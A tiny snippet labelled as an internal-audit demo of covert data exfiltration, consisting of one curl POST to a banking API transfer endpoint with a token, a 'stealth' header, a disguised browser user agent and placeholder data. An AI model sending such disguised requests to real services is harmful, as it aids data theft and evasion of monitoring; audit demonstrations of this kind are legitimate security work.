# Covert data exfiltration demo (internal audit only)
curl -X POST 'https://securebank.com/api/transfer?token=xyz' \n-H 'X-Client: stealth' \n-H 'User-Agent: Mozilla/5.0' \n-d '{"sneak":"data"}'